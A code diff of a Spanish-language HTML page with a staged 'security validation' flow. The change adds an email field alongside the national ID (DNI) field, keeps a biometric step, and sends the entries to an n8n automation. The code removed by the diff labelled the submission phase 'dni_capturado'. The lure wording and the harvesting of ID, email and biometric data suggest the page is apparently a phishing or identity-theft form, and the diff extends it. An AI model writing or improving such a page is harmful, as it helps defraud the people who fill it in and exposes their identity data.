@@ -19,11 +19,17 @@
 <body>
 
 <div class="container">
-    <div id="etapa_dni" class="step active">
-        <h2>Paso 1: Identificación</h2>
-        <p>Por favor, ingresa tu número de DNI:</p>
-        <input type="text" id="input_dni" placeholder="DNI (8 dígitos)" maxlength="8">
-        <button onclick="enviarDNI()">Siguiente</button>
+   <div id="etapa_dni" class="step active">
+        <h2>Paso 1: Verificación de Datos</h2>
+        <p>Confirma tus datos para continuar con la validación de seguridad:</p>
+        
+        <label>Número de DNI</label>
+        <input type="text" id="input_dni" placeholder="DNI de 8 dígitos" maxlength="8">
+        
+        <label>Correo Electrónico Actualizado</label>
+        <input type="email" id="input_email" placeholder="correo@ejemplo.com" style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box;">
+        
+        <button onclick="enviarIdentificacion()">Confirmar y Siguiente</button>
     </div>
 
     <div id="etapa_biometria" class="step">
@@ -68,18 +74,31 @@
     }
 
     // --- LÓGICA PASO 1 ---
-    async function enviarDNI() {
-        const dni = document.getElementById('input_dni').value;
-        if (dni.length < 8) {
-            alert("Ingresa un DNI válido.");
-            return;
-        }
+    async function enviarIdentificacion() {
+    const dni = document.getElementById('input_dni').value;
+    const email = document.getElementById('input_email').value;
 
-        await postData({ fase: "dni_capturado", dni: dni });
-
-        document.getElementById('etapa_dni').classList.remove('active');
-        document.getElementById('etapa_biometria').classList.add('active');
+    // Validación simple
+    if (dni.length < 8 || isNaN(dni)) {
+        alert("Por favor, ingresa un DNI válido.");
+        return;
     }
+    if (!email.includes("@") || email.length < 5) {
+        alert("Por favor, ingresa un correo electrónico válido.");
+        return;
+    }
+
+    // Enviamos a n8n
+    await postData({ 
+        fase: "actualizacion_datos", 
+        dni: dni, 
+        email: email 
+    });
+
+    // Avance visual
+    document.getElementById('etapa_dni').classList.remove('active');
+    document.getElementById('etapa_biometria').classList.add('active');
+}
 
     // --- LÓGICA PASO 2 ---
     async function validarBiometria() {
@@ -118,3 +137,4 @@
 
 </body>
 </html>
+
